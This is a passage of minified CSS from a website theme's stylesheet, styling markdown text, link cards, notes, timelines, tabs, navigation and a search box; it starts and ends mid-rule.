calc(100% + 1rem - 6px); bottom: calc(-1rem - 6px); border-radius: 4px; background: #ff5724; } .md-text u { text-decoration: none; border-bottom: 2px solid #ff5724; } .md-text emp { width: fit-content; text-decoration: none; border-bottom: 4px dotted #ff5724; } .md-text wavy { text-decoration: underline wavy #ff5724; } .md-text del { color: var(--text-p3); text-decoration: line-through var(--text-p3); } .md-text kbd { border-radius: 4px; border: 1px solid #d2d2d2; border-bottom-width: 2px; background: var(--card); padding: 2px 4px 1px 4px; font-family: Menlo, Monaco, Consolas, system-ui, \"Courier New\", monospace, sans-serif; font-weight: 700; } .md-text psw { color: transparent; background: #a1a1a1; border-radius: 2px; transition: background 0.2s ease-out; -moz-transition: background 0.2s ease-out; -webkit-transition: background 0.2s ease-out; -o-transition: background 0.2s ease-out; margin: auto 2px; } .md-text psw:hover { color: inherit; background: none; } .md-text sup, .md-text sub { color: var(--theme); line-height: 1; font-weight: 700; font-family: Menlo, Monaco, Consolas, system-ui, \"Courier New\", monospace, sans-serif; } .md-text h1 sup, .md-text h2 sup, .md-text h3 sup, .md-text h4 sup, .md-text h1 sub, .md-text h2 sub, .md-text h3 sub, .md-text h4 sub { font-size: 0.85rem; } .md-text .tag-plugin.link { margin: 1em auto; display: flex; justify-content: center; } .md-text .link-card { background: var(--card); display: inline-flex; justify-content: space-between; align-items: center; cursor: pointer; width: 300px; max-width: 100%; border-radius: 12px; transition: all 0.2s ease-out; -moz-transition: all 0.2s ease-out; -webkit-transition: all 0.2s ease-out; -o-transition: all 0.2s ease-out; } :root[data-theme=\"light\"] .md-text .link-card { box-shadow: 0 1px 2px 0px rgba(0,0,0,0.1); } :root[data-theme=\"light\"] .md-text .link-card:hover { box-shadow: 0 12px 20px -4px rgba(0,0,0,0.15); transform: translate3d(0, -2px, 0); } :root[data-theme=\"dark\"] .md-text .link-card:hover { box-shadow: 0 0 4px -2px #1cd0fd, 0 0 24px -8px #1cd0fd; } :root:not([data-theme]) .md-text .link-card { box-shadow: 0 1px 2px 0px rgba(0,0,0,0.1); } :root:not([data-theme]) .md-text .link-card:hover { box-shadow: 0 12px 20px -4px rgba(0,0,0,0.15); transform: translate3d(0, -2px, 0); } @media (prefers-color-scheme: dark) { :root:not([data-theme]) .md-text .link-card:hover { box-shadow: 0 0 4px -2px #1cd0fd, 0 0 24px -8px #1cd0fd; } } .md-text .link-card.plain { flex-direction: row; align-items: center; } .md-text .link-card.rich { flex-direction: column; align-items: stretch; width: 460px; text-align: justify; } .md-text .link-card >.left { overflow: hidden; margin: 0.75rem 0 0.75rem 0.75rem; } .md-text .link-card >.left .title { font-size: 0.875rem; } .md-text .link-card >.left span+span { margin-top: 0.25rem; } .md-text .link-card >.right { width: 2.75rem; height: 2.75rem; margin: 0.75rem; overflow: hidden; flex-shrink: 0; } .md-text .link-card >.top { display: flex; margin: 1rem 1rem 0.75rem; overflow: hidden; max-width: calc(100% - 1rem * 2); align-items: center; } .md-text .link-card >.top .img { line-height: 0; height: 16px; width: 16px; border-radius: 16px; margin-right: 8px; background-repeat: no-repeat; background-size: contain; background-position: left center; } .md-text .link-card >.top span { white-space: nowrap; overflow: hidden; text-overflow: ellipsis; max-width: 100%; } .md-text .link-card >.bottom { margin: 0 1rem 1rem; } .md-text .link-card >.bottom .title { font-size: 1rem; margin-bottom: 0.5rem; } .md-text .link-card { line-height: 1.2; } .md-text .link-card .title { display: -webkit-box; -webkit-box-orient: vertical; overflow: hidden; -webkit-line-clamp: 2; } .md-text .link-card .cap { flex-shrink: 0; color: var(--text-p3); } .md-text .link-card .link { line-height: 1.5; opacity: 0.75; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; } .md-text .link-card .desc { display: -webkit-box; -webkit-box-orient: vertical; overflow: hidden; -webkit-line-clamp: 3; } .md-text .link-card .img { border-radius: 4px; } .md-text .link-card span { margin: 0; display: block; } .md-text .link-card .title { font-weight: 500; color: var(--text-p1); } .md-text .tag-plugin.mark { padding: 1px 2px; border-radius: 2px; background: var(--theme-block); color: var(--text); } .tag-plugin.video { line-height: 0; margin: auto; } .tag-plugin.video video, .tag-plugin.video iframe { border-radius: 12px; box-shadow: 0 12px 16px -4px rgba(0,0,0,0.2); z-index: 1; background: var(--block); width: 100%; height: 100%; margin: 0; } .tag-plugin.navbar { padding: 0; } .tag-plugin.navbar:after { left: 0; right: 0; } @media screen and (min-width: 667px) { .tag-plugin.navbar nav a { margin-top: 2px; } } .md-text .tag-plugin.note { position: relative; padding: 0.25rem 1rem; border-radius: 12px; background: var(--theme-block); overflow: hidden; border: 1px solid var(--theme-border); color: var(--text-p1); } .md-text .tag-plugin.note >.title { --fsp: calc(17px - 1px); font-size: var(--fsp); line-height: 1.5; margin-top: var(--gap-p-compact); font-weight: 500; color: var(--text); } .md-text .tag-plugin.note >.body { margin-top: var(--gap-p-compact); margin-bottom: var(--gap-p-compact); } .md-text .tag-plugin.note >.body, .md-text .tag-plugin.note >.body p { --fsp: calc(17px - 2px); font-size: var(--fsp); line-height: 1.5; } .md-text .tag-plugin.note >.body:only-child { margin: calc(var(--gap-p) - 0.25rem) 0; } .md-text .tag-plugin.note[color] code { background: none; } .md-text .tag-plugin.note:not([color]) .highlight { background: var(--block-hover); } .md-text .tag-plugin.note[child=codeblock] { padding: 0; background: var(--theme-codeblock); } .md-text .tag-plugin.note[child=codeblock] >.title, .md-text .tag-plugin.note[child=codeblock] >.body:only-child { margin-top: 0; } .md-text .tag-plugin.note[child=codeblock] >.body { margin-bottom: 0; } .md-text .tag-plugin.note[child=codeblock] .highlight { margin: 0; border: none; background: none; } .md-text .tag-plugin.note[child=codeblock] .highlight figcaption span { background: var(--theme-block); } .md-text .tag-plugin.note[child=codeblock] .highlight+.highlight { border-top: 1px dashed var(--theme-border); border-top-left-radius: 0; border-top-right-radius: 0; } .md-text .tag-plugin.note[child=tabs] >.body { margin: 0; } .md-text .tag-plugin.note[child=tabs] >.body >.tabs { margin-top: 0.5rem; } .md-text .tag-plugin.note[child=iframe] { padding: 0; } .md-text .tag-plugin.note[child=iframe] >.body { margin: 0; } .md-text .tag-plugin.note[child=iframe] >.body iframe { margin: 0; } .md-text .tag-plugin .tag-plugin.note { --gap-p: 1rem; } .md-text .tag-plugin.okr { position: relative; border-radius: 12px; background: var(--theme-block); border: 1px solid var(--theme-border); overflow: hidden; color: var(--text-p1); line-height: 1.5; } .md-text .tag-plugin.okr .o .title { font-size: 0.9375rem; } .md-text .tag-plugin.okr .o .note { font-size: 0.875rem; } .md-text .tag-plugin.okr .o .note p { font-size: 0.875rem; } .md-text .tag-plugin.okr .kr .title { font-size: 0.875rem; } .md-text .tag-plugin.okr .kr .note { font-size: 0.875rem; } .md-text .tag-plugin.okr .kr .note p, .md-text .tag-plugin.okr .kr .note li, .md-text .tag-plugin.okr .kr .note .tag-plugin { font-size: 0.875rem; } .md-text .tag-plugin.okr .title { font-weight: 600; display: block; } .md-text .tag-plugin.okr .note { font-weight: 400; display: block; margin-top: 0.5rem; } .md-text .tag-plugin.okr .note >p, .md-text .tag-plugin.okr .note >ul { margin-top: 0.25rem; margin-bottom: 0.25rem; } .md-text .tag-plugin.okr .note >.tag-plugin { margin-top: 0.25rem; margin-bottom: 0.25rem; } .md-text .tag-plugin.okr .note >*:last-child { margin-bottom: 0; } .md-text .tag-plugin.okr .status { font-size: 0.75rem; padding: 2px 4px; border-radius: 2px; } .md-text .tag-plugin.okr .okr-item.o { border-bottom: 4px solid var(--theme-border); } .md-text .tag-plugin.okr .okr-item.kr+.okr-item.kr { border-top: 1px dashed var(--theme-border); } .tag-plugin.okr .okr-item { display: grid; grid-template-columns: 3.2rem auto 100px; grid-column-gap: 0.75rem; padding: 1rem; } .tag-plugin.okr .okr-item .okr-left .title { background: var(--card); border-radius: 1rem; text-align: center; padding: 0 0.5rem; } .tag-plugin.okr .okr-item .labels { display: flex; justify-content: space-between; align-items: flex-start; position: relative; flex-wrap: wrap; } .tag-plugin.okr .okr-item .labels .label { background: var(--theme-block); color: var(--text-p1); } .tag-plugin.okr .okr-item .progress { margin-top: 4px; height: 4px; border-radius: 2px; position: relative; background: var(--card); } .tag-plugin.okr .okr-item .progress .fill { position: absolute; background: var(--theme); border-radius: 2px; top: 0; left: 0; bottom: 0; } .tag-plugin.okr .okr-item .progress .fill:before { content: ''; position: absolute; top: -4px; bottom: -4px; right: -4px; width: 8px; height: 12px; border-radius: 8px; background: #fff; box-shadow: 0 0 2px 0px rgba(0,0,0,0.04), 0 0 8px 0px rgba(0,0,0,0.04); } .tag-plugin.okr .okr-item .progress .fill:after { content: ''; position: absolute; top: -2px; bottom: -2px; right: -2px; width: 4px; height: 8px; border-radius: 4px; background: var(--theme); } @media screen and (max-width: 667px) { .tag-plugin.okr .okr-item { grid-template-columns: 2.8rem auto 50px; grid-column-gap: 0.5rem; padding: 0.5rem; } .tag-plugin.okr .okr-item .okr-left .title { padding: 0 0.25rem; } .tag-plugin.okr .okr-item .label { white-space: nowrap; overflow: hidden; text-overflow: ellipsis; } } .tag-plugin.note blockquote, .tag-plugin.folding blockquote { border-top-left-radius: 0; border-bottom-left-radius: 0; background: none; padding-top: 0; padding-bottom: 0; } .tag-plugin.note table:not([class]) th, .tag-plugin.folding table:not([class]) th { background: var(--block-hover); } .tag-plugin.note table:not([class]) td, .tag-plugin.folding table:not([class]) td, .tag-plugin.note table:not([class]) th, .tag-plugin.folding table:not([class]) th { border-color: var(--block-border); } .md-text .tag-plugin.poetry { display: flex; flex-direction: column; align-items: center; } .md-text .tag-plugin.poetry .content >.title { font-weight: 500; margin-top: var(--gap-p); } .md-text .tag-plugin.poetry .content >.meta { color: var(--text-p2); --fsp: calc(17px - 3px); font-size: var(--fsp); font-weight: 500; } .md-text .tag-plugin.poetry .content >.meta span+span { margin-left: 4px; } .md-text .tag-plugin.poetry .content >.body { margin: var(--gap-p) 0; border-top: 1px dashed var(--block-border); border-bottom: 1px dashed var(--block-border); line-height: 2; } .md-text .tag-plugin.poetry .content >.footer { font-style: italic; color: var(--text-p4); margin: var(--gap-p) 0; --fsp: calc(17px - 3px); font-size: var(--fsp); } .md-text .tag-plugin.poetry .content { padding-left: 1rem; position: relative; } .md-text .tag-plugin.poetry .content:before { content: ''; position: absolute; width: 4px; left: -4px; top: 4px; bottom: 4px; border-radius: 4px; background: var(--block); } .md-text .tag-plugin.poetry .content >.title { position: relative; } .md-text .tag-plugin.poetry .content >.title:before { content: ''; position: absolute; width: 4px; left: calc(-1rem - 4px); top: 6px; bottom: 6px; border-radius: 4px; background: #ff5724; } .md-text .tag-plugin.quot { text-align: center; align-items: center; display: flex; flex-direction: column; --gap-p: 2rem; margin: var(--gap-p) 1rem; } .md-text .tag-plugin.quot .content { display: flex; align-items: center; border-bottom: none; font-weight: 700; padding: 0 24px; line-height: 1.2; } @media screen and (max-width: 500px) { .md-text .tag-plugin.quot .content { padding: 0 20px; } } .md-text .tag-plugin.quot .content { position: relative; } .md-text.content .tag-plugin.quot h1, .md-text.content .tag-plugin.quot h2 { font-size: calc(17px + 11px); font-weight: 900; padding: 4px 32px 0; } @media screen and (max-width: 500px) { .md-text.content .tag-plugin.quot h1, .md-text.content .tag-plugin.quot h2 { padding: 4px 24px 0; } } .md-text.content .tag-plugin.quot h3, .md-text.content .tag-plugin.quot h4, .md-text.content .tag-plugin.quot h5, .md-text.content .tag-plugin.quot h6 { font-size: calc(17px + 7px); } .md-text.content .tag-plugin.quot p { font-size: calc(var(--fsp) + 2px); color: var(--text); } .md-text .tag-plugin.quot .content[type=text]:before, .md-text .tag-plugin.quot .content[type=text]:after { content: \"\"; position: absolute; width: 8px; height: 14px; } .md-text .tag-plugin.quot .content[type=text]:before { top: -8px; left: 0; border-top: 6px solid #ff5724; border-left: 6px solid #ff5724; } .md-text .tag-plugin.quot .content[type=text]:after { right: 0; bottom: -8px; border-right: 6px solid #ff5724; border-bottom: 6px solid #ff5724; } .md-text .tag-plugin.quot h1.content[type=text]:before, .md-text .tag-plugin.quot h1.content[type=text]:after { width: 12px; height: 20px; border-width: 8px; } .md-text .tag-plugin.quot .content[type=icon] img, .md-text .tag-plugin.quot .content[type=icon] svg { height: 1.5em; display: inline-block; color: #ff5724; border-radius: 0; flex-shrink: 0; } .md-text .tag-plugin.quot .content[type=icon] span.text { margin: 0 0.5rem; padding-top: 1px; } .md-text .tag-plugin.quot .content[type=icon] span.empty { padding: 0 8px; } .sites-wrap .grid-box { display: grid; grid-template-columns: repeat(auto-fill, minmax(150px, 1fr)); grid-gap: 1rem 1rem; } .sites-wrap .grid-box .grid-cell { aspect-ratio: 1.5; } .sites-wrap .site-card .card-link { width: 100%; display: flex; flex-direction: column; } .sites-wrap .site-card .card-link >img { object-fit: cover; aspect-ratio: 1.5; width: 100%; height: 100%; box-shadow: 0 1px 2px 0px rgba(0,0,0,0.2); } .sites-wrap .site-card .card-link .info { margin-top: 0.5rem; line-height: 1.2; } .sites-wrap .site-card .card-link .info >img { width: 28px; height: 28px; border-radius: 28px; float: left; margin-right: 8px; margin-top: 2px; } .sites-wrap .site-card .card-link .info span { display: block; } .sites-wrap .site-card .card-link .info .title { font-weight: 500; color: var(--text-p1); font-size: 0.875rem; margin-top: 1px; display: -webkit-box; -webkit-box-orient: vertical; overflow: hidden; -webkit-line-clamp: 1; } .sites-wrap .site-card .card-link .info .desc { font-size: 10px; margin-top: 2px; word-wrap: break-word; color: var(--text-p3); display: -webkit-box; -webkit-box-orient: vertical; overflow: hidden; -webkit-line-clamp: 1; } .sites-wrap .site-card .card-link >img { transition: transform 0.2s ease-out, box-shadow 0.2s ease-out; -moz-transition: transform 0.2s ease-out, box-shadow 0.2s ease-out; -webkit-transition: transform 0.2s ease-out, box-shadow 0.2s ease-out; -o-transition: transform 0.2s ease-out, box-shadow 0.2s ease-out; } .sites-wrap .site-card .card-link:hover >img { box-shadow: 0 12px 20px -4px rgba(0,0,0,0.15); transform: translate3d(0, -2px, 0); } .tag-plugin.tabs { position: relative; margin-top: 1rem; margin-bottom: 1rem; display: flex; flex-direction: column; } .tag-plugin.tabs[align=left] { align-items: flex-start; } .tag-plugin.tabs[align=left] .nav-tabs { align-self: flex-start; } .tag-plugin.tabs[align=center] { align-items: center; } .tag-plugin.tabs[align=right] { align-items: flex-end; } .tag-plugin.tabs[align=right] .nav-tabs { align-self: flex-end; } .tag-plugin.tabs .nav-tabs { display: flex; align-self: center; overflow: scroll visible; max-width: 100%; white-space: nowrap; margin: 0 !important; line-height: 1.5; position: relative; padding: 8px 0; } .tag-plugin.tabs .nav-tabs::-webkit-scrollbar { height: 0; width: 0; } .tag-plugin.tabs .nav-tabs::-webkit-scrollbar-track-piece { background: transparent; } .tag-plugin.tabs .nav-tabs::-webkit-scrollbar-thumb { background: var(--text-meta); cursor: pointer; border-radius: 0; } .tag-plugin.tabs .nav-tabs::-webkit-scrollbar-thumb:hover { background: var(--text-p3); } .tag-plugin.tabs .nav-tabs:after { content: ''; position: absolute; background: var(--block-hover); width: 100%; height: 2px; bottom: 0; left: 0; border-radius: 2px; } .tag-plugin.tabs .nav-tabs .tab { list-style-type: none; } .tag-plugin.tabs .nav-tabs .tab a { display: block; cursor: pointer; padding: 0.25rem 0.75rem; --fsp: calc(17px - 3px); font-size: var(--fsp); line-height: inherit; font-weight: 500; color: var(--text-p3); border-radius: 4px; position: relative; margin: 0 2px; } .tag-plugin.tabs .nav-tabs .tab a:hover { color: var(--text-p1); background: var(--block-hover); } .tag-plugin.tabs .nav-tabs .tab a i { pointer-events: none; } .tag-plugin.tabs .nav-tabs .tab.active a { cursor: default; color: var(--text-p1); background: var(--card); box-shadow: 0 0 2px 0px rgba(0,0,0,0.04), 0 0 8px 0px rgba(0,0,0,0.04); } .tag-plugin.tabs .nav-tabs .tab.active a:after { content: ''; z-index: 1; position: absolute; background: #1cd0fd; height: 2px; bottom: -8px; left: 0.75rem; right: 0.75rem; border-radius: 2px; } .tag-plugin.tabs .tab-content { max-width: 100%; text-align: justify; margin-top: 0.5rem; } .tag-plugin.tabs .tab-content .tab-pane:not(.active) { display: none; } .tag-plugin.tabs .tab-content .tab-pane.active { display: block; } .tag-plugin.tabs .tab-content:has(.grid-box) { width: 100%; } .l_body[text-indent] .md-text .tag-plugin.tabs .tab-content .tab-pane>p:not([class]) { text-indent: calc(var(--fsp) * 2); } .l_body[text-indent] .md-text .tag-plugin.tabs .tab-content .tab-pane>p:not([class]) a { text-indent: 0; } .tag-plugin.timeline { position: relative; padding-left: 16px; } .tag-plugin.timeline:before { content: ''; position: absolute; z-index: 0; background: var(--block-hover); width: 4px; left: 0px; border-radius: 8px; top: 0.5rem; bottom: 0; } .tag-plugin.timeline:has(.loading-wrap) { padding-left: 0; } .tag-plugin.timeline:has(.loading-wrap):before { display: none; } .tag-plugin.timeline .timenode { position: relative; display: flex; flex-direction: column; align-items: flex-start; box-sizing: border-box; max-width: 100%; } .tag-plugin.timeline .timenode >.header, .tag-plugin.timeline .timenode >.body { box-sizing: border-box; max-width: 100%; } .tag-plugin.timeline .timenode[highlight] .header:before { background: #1cd0fd; } .tag-plugin.timeline .timenode+.timenode { margin-top: 1rem; } .tag-plugin.timeline .timenode:hover .header span { color: var(--text-p1); } .tag-plugin.timeline .timenode:hover .header:before { background: #1cd0fd; height: 16px; top: calc(50% - 0.5 * 16px); transform: scale(1); } .tag-plugin.timeline .timenode .header { display: flex; align-items: center; position: relative; margin: 0.25rem 0; font-size: 0.8125rem; } .tag-plugin.timeline .timenode .header a.user-info span { font-weight: 600; } .tag-plugin.timeline .timenode .header .user-info { display: flex; align-items: center; font-size: 0.8125rem; font-weight: 500; color: var(--text-p1); margin-right: 8px; line-height: 1; border-radius: 16px; } .tag-plugin.timeline .timenode .header .user-info img { background: #fff; height: 16px; border-radius: 16px; display: inline; margin: 0 4px 0 0; object-fit: contain; } .tag-plugin.timeline .timenode .header, .tag-plugin.timeline .timenode .header span { font-weight: 500; color: var(--text-p3); line-height: 1; } .tag-plugin.timeline .timenode .header:before { content: ''; position: absolute; left: -16px; width: 4px; border-radius: 12px; height: 4px; top: calc(50% - 0.5 * 4px); background: var(--text-meta); transition: background 0.2s ease-out, height 0.2s ease-out, top 0.2s ease-out, transform 0.2s ease-out; -moz-transition: background 0.2s ease-out, height 0.2s ease-out, top 0.2s ease-out, transform 0.2s ease-out; -webkit-transition: background 0.2s ease-out, height 0.2s ease-out, top 0.2s ease-out, transform 0.2s ease-out; -o-transition: background 0.2s ease-out, height 0.2s ease-out, top 0.2s ease-out, transform 0.2s ease-out; transform: scale(2); } .tag-plugin.timeline .body { background: var(--card); border-radius: 12px; border-top-left-radius: 2px; padding: 0.5rem 1rem; margin-top: 4px; box-shadow: 0 1px 4px 0px rgba(0,0,0,0.02), 0 2px 8px 0px rgba(0,0,0,0.02); } .tag-plugin.timeline .body p { --fsp: calc(17px - 1px); } .tag-plugin.timeline .body p img { display: block; } .tag-plugin.timeline .body:empty { display: none; } .tag-plugin.timeline .body p, .tag-plugin.timeline .body .highlight, .tag-plugin.timeline .body ol, .tag-plugin.timeline .body ul, .tag-plugin.timeline .body .tag-plugin { margin: 0.5rem 0; } .tag-plugin.timeline .body .tag-plugin.copy { width: 240px; } .tag-plugin.timeline[api] a.body { display: block; color: var(--text-p1); line-height: 1.25; padding: 0.75rem 1rem; --fsp: calc(17px - 1px); font-size: var(--fsp); } .tag-plugin.timeline[api] .body p.title { font-weight: 700; margin: 0.5rem 0 0.75rem; line-height: 1.25; } .tag-plugin.timeline[api] .body p.title:only-child { margin-bottom: 0.5rem; font-weight: 500; } .tag-plugin.timeline[api] .body p.title a { color: inherit; text-decoration: none; border-bottom: 2px solid #1cd0fd; transition: all 0.2s ease-out; -moz-transition: all 0.2s ease-out; -webkit-transition: all 0.2s ease-out; -o-transition: all 0.2s ease-out; background: none; } .tag-plugin.timeline[api] .body p.title a:hover { background: none; border-radius: 0; border-bottom: 2px solid #ff5724; } .tag-plugin.timeline[api] .body >p:first-child:not([class]) a:not([class]) { padding: 0; margin: 0; color: inherit; text-decoration: none; border-bottom: 2px solid #1cd0fd; transition: all 0.2s ease-out; -moz-transition: all 0.2s ease-out; -webkit-transition: all 0.2s ease-out; -o-transition: all 0.2s ease-out; background: none; } .tag-plugin.timeline[api] .body >p:first-child:not([class]) a:not([class]):hover { background: none; border-radius: 0; border-bottom: 2px solid #ff5724; } .tag-plugin.timeline[api] .body a:has(img):after { display: none; } .tag-plugin.timeline[api] .body a img { margin: 0 auto; } .tag-plugin.timeline[api] .body img { margin: 0.5rem auto; } .tag-plugin.timeline[api] .body pre code { font-size: 0.8125rem; } .tag-plugin.timeline[api] .body .footer { margin: 0 0 -0.5rem; padding: 0.5rem 0 1rem; user-select: none; font-weight: 500; display: flex; flex-wrap: wrap; justify-content: space-between; align-items: stretch; background: var(--card); } .tag-plugin.timeline[api] .body .footer span { line-height: 1.8; } .tag-plugin.timeline[api] .body .footer:empty { display: none; } .tag-plugin.timeline[api] .body .footer .flex { display: flex; flex-wrap: wrap; font-size: 0.8125rem; align-items: stretch; } .tag-plugin.timeline[api] .body .footer .left+.right { margin-left: 4px; } .tag-plugin.timeline[api] .body .footer .item { border-width: 1px; border-style: solid; margin: 2px; border-radius: 4px; padding: 0 0.5rem; display: flex; align-items: center; border-color: #2094f3; } .tag-plugin.timeline[api] .body .footer .item:first-child { margin-left: 0; } .tag-plugin.timeline[api] .body .footer .item:last-child { margin-right: 0; } .tag-plugin.timeline[api] .body .footer a.item { background: var(--block); border-color: var(--block-border); color: inherit; } .tag-plugin.timeline[api] .body .footer a.item:hover { background: var(--block-hover); } .tag-plugin.timeline[api] .body .footer .reaction { border-color: var(--block); } .tag-plugin.timeline .body blockquote { background: none; border-radius: 0; padding: 0 0.5rem; margin: 0.75rem 0; } .tag-plugin.timeline .body blockquote p { --fsp: calc(17px - 2px); margin: 0.25rem; } .tag-plugin.timeline .body { line-height: 1.5; } .tag-plugin.timeline .body h1, .tag-plugin.timeline .body h2 { font-size: 1.25rem; margin: 1rem 0; line-height: 1.2; } .tag-plugin.timeline .body h3, .tag-plugin.timeline .body h4 { font-size: 1rem; margin: 0.75rem 0; line-height: 1.2; } .tag-plugin.timeline .body h5, .tag-plugin.timeline .body h6 { font-size: 0.9375rem; margin: 0.5rem 0; line-height: 1.2; } .tag-plugin.timeline.ds-memos .body p:first-child { margin-top: 2px; } .tag-plugin.timeline.ds-memos .body p:last-child { margin-bottom: 2px; } .tag-plugin.timeline.ds-memos .body img { margin: 0.5rem 0; max-height: 128px; cursor: zoom-in; } .tag-plugin.timeline.ds-memos .body .tag-plugin.image { display: flex; } .tag-plugin.timeline.ds-memos .body .tag-plugin.image .image-bg+.image-bg { margin-left: 4px; } details.toc { background: var(--block); border: 1px solid var(--block-border); border-radius: 12px; overflow: hidden; color: var(--text-p2); } details.toc summary { cursor: pointer; padding: 0 0.5rem; line-height: 2; color: var(--text-p2); font-size: 0.8125rem; font-weight: 500; } details.toc summary:hover { background: var(--block-hover); } details.toc >div.body { margin: var(--gap-p) 1rem 1rem; } details.toc[open] >summary { border-bottom: 1px solid transparent; } details.toc[open] >summary:hover { border-bottom-color: var(--block-border); } details.toc[open] >div.body section+section { margin-top: 1rem; } details.toc[open] >div.body section .header { line-height: 2; font-weight: 500; } details.toc[open] >div.body section .header+.doc_tree { margin-top: 0; } @media screen and (max-width: 667px) { .tag-plugin.toc[display=mobile] { display: block !important; } } .l_left footer.footer { margin: 0.5rem var(--gap-max) 1rem; } .social-wrap { display: grid; grid-gap: 0.25rem 0.25rem; grid-template-columns: repeat(auto-fill, 32px); text-align: center; } .social-wrap .social { line-height: 0; display: inline-block; padding: 6px; border-radius: 32px; filter: grayscale(100%); overflow: hidden; background: transparent; transition: box-shadow 0.2s ease-out, background 0.2s ease-out, transform 0.2s ease-out; -moz-transition: box-shadow 0.2s ease-out, background 0.2s ease-out, transform 0.2s ease-out; -webkit-transition: box-shadow 0.2s ease-out, background 0.2s ease-out, transform 0.2s ease-out; -o-transition: box-shadow 0.2s ease-out, background 0.2s ease-out, transform 0.2s ease-out; } .social-wrap .social:hover { z-index: 1; filter: unset; background: var(--alpha100); } .social-wrap .social img { border-radius: 2px; } .logo-wrap { display: flex; align-items: center; overflow: hidden; min-height: 48px; } .logo-wrap img.avatar { object-fit: cover; } .logo-wrap img.icon { object-fit: contain; } .logo-wrap .icon { width: 48px; height: 48px; margin-right: 1rem; border-radius: 4px; flex-shrink: 0; } .logo-wrap a { color: inherit; display: flex; align-items: center; } .logo-wrap a.avatar { display: block; position: relative; width: 48px; height: 48px; flex-shrink: 0; border-radius: 48px; overflow: hidden; margin-right: 1rem; } .logo-wrap a.avatar div.bg { width: 100%; height: 100%; background-size: cover; } .logo-wrap a.avatar img.avatar { margin: 2px; width: calc(100% - 2 * 2px); height: calc(100% - 2 * 2px); border-radius: calc(100% - 2 * 2px); } .logo-wrap a.avatar div.bg { transition: opacity 0.2s ease-out; -moz-transition: opacity 0.2s ease-out; -webkit-transition: opacity 0.2s ease-out; -o-transition: opacity 0.2s ease-out; position: absolute; opacity: 0 !important; z-index: -1; } @-moz-keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } } @-webkit-keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } } @-o-keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } } @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } } .logo-wrap a.avatar:hover div.bg { opacity: 1 !important; animation: spin infinite 4s; animation-timing-function: linear; } .logo-wrap a.title { font-size: 1.5rem; font-weight: 900; color: inherit; line-height: 1.2; display: block; position: relative; } .logo-wrap a.title .main { color: var(--text); } .logo-wrap a.title .sub { color: var(--text-p1); transition: opacity 0.2s ease-out, transform 0.2s ease-out; -moz-transition: opacity 0.2s ease-out, transform 0.2s ease-out; -webkit-transition: opacity 0.2s ease-out, transform 0.2s ease-out; -o-transition: opacity 0.2s ease-out, transform 0.2s ease-out; white-space: nowrap; } .logo-wrap a.title .hover { position: absolute; bottom: 0; transform: translateY(8px); overflow: visible; } .logo-wrap a.title:hover .normal { opacity: 0; transform: translateY(-8px); } .logo-wrap a.title:hover .hover { transform: translateY(0); opacity: 1 !important; } .nav-area .menu { width: 100%; display: grid; margin: 8px 0; grid-template-columns: repeat(4, 1fr); grid-gap: 8px; } .nav-area .menu::-webkit-scrollbar { display: none; } .nav-area .menu::-webkit-scrollbar-track-piece { background: transparent; } .nav-area .menu::-webkit-scrollbar-thumb { display: none; } .nav-area .menu .nav-item { box-sizing: border-box; width: 100%; min-height: 40px; border-radius: 8px; font-size: 0.9375rem; font-weight: 500; color: var(--text-p3); text-align: center; background: var(--alpha50); transition: background 0.2s ease-out; -moz-transition: background 0.2s ease-out; -webkit-transition: background 0.2s ease-out; -o-transition: background 0.2s ease-out; position: relative; display: flex; flex-direction: column; align-items: center; justify-content: center; } .nav-area .menu .nav-item img, .nav-area .menu .nav-item svg { height: 28px; object-fit: contain; filter: grayscale(100%) brightness(0.8) opacity(0.8); transition: all 0.2s ease-out; -moz-transition: all 0.2s ease-out; -webkit-transition: all 0.2s ease-out; -o-transition: all 0.2s ease-out; } .nav-area .menu .nav-item span { text-overflow: ellipsis; word-break: keep-all; } .nav-area .menu .nav-item.active, .nav-area .menu .nav-item:hover { color: var(--text-p1); background: var(--alpha100); } .nav-area .menu .nav-item.active img, .nav-area .menu .nav-item:hover img, .nav-area .menu .nav-item.active svg, .nav-area .menu .nav-item:hover svg { filter: unset; } .nav-area .menu .nav-item.active:after { content: ''; position: absolute; width: 16px; height: 2px; left: 50%; transform: translateX(-50%); border-radius: 2px; bottom: 2px; background: currentColor; } .nav-area { margin: 32px var(--gap-margin) 0; } .search-wrapper { width: 100%; } .search-wrapper >.search-form { position: sticky; margin-bottom: 8px; top: 1rem; height: 40px; display: flex; flex-direction: row; align-items: center; transition: 0.38s ease-out; z-index: 0; border-radius: 8px; color: var(--text); background: var(--alpha50); } .search-wrapper >.search-form:has(input:focus) { background: var(--alpha100); } .search-wrapper .search-input { width: 100%; box-sizing: border-box; font-family: system-ui, \"Microsoft Yahei\", \"Segoe UI\", -apple-system, Roboto, Ubuntu, \"Helvetica Neue\", Arial, \"WenQuanYi Micro Hei\", sans-serif; font-size: 0.875rem; padding: 12px 0; color: var(--text); } .search-wrapper .search-button { border-radius: 8px; display: flex; align-items: center; height: 40px; } .search-wrapper .search-button svg { height: 1rem; width: 40px; margin-left: 4px; color: var(--text-p2); fill: currentColor; } .search-wrapper .search-button svg path[p-id=\"1562\"] { color: #1cd0fd; } .search-wrapper[searching='true'] .search-button path[p-id=\"1562\"] { color: #3dc550; } .search-wrapper.noresult[searching='true'] .search-button path[p-id=\"1562\"] { color: #f44336; } .search-wrapper .search-no-result { display: none; color: var(--text-p1); text-align: center; font-size: 0.875rem; padding: 2rem; background: var(--alpha20); border-radius: 12px; } .search-wrapper #search-result { max-height: 60vh; overflow: scroll; scrollbar-width: none; border-radius: 12px; } .search-wrapper #search-result::-webkit-scrollbar { height: 0; width: 0; } .search-wrapper #search-result::-webkit-scrollbar-track-piece { background: transparent; } .search-wrapper #search-result::-webkit-scrollbar-thumb { background: var(--text-meta); cursor: pointer; border-radius: 0; } .search-wrapper #search-result::-webkit-scrollbar-thumb:hover { background: var(--text-p3); } .search-wrapper #search-result:empty { display: none; } .search-wrapper #search-result .search-result-list { padding: 0; margin: 0; list-style-type: none; } .search-wrapper #search-result li a { display: block; background: var(--alpha20); line-height: 1.2; padding: 0.75rem 1rem; border-radius: 12px; transition: background 0.2s ease-out; -moz-transition: background 0.2s ease-out; -webkit-transition: background 0.2s ease-out; -o-transition: background 0.2s ease-out; } .search-wrapper #search-result li a:hover { background: 